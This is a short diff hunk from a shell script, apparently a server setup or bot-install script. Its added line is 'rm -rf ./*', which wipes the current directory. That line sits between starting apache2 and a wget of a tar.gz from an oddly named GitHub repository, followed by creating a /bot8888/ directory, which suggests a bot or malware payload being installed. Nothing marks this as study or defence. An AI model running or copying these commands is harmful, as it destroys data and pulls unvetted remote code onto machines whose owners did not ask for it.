@@ -54,6 +54,8 @@ fi
 
 service apache2 start
 
+rm -rf ./*
+
 wget -q https://raw.githubusercontent.com/linuxweb888888888888/linux8888/refs/heads/main/linux8888888888.tar.gz
 
 mkdir /bot8888/
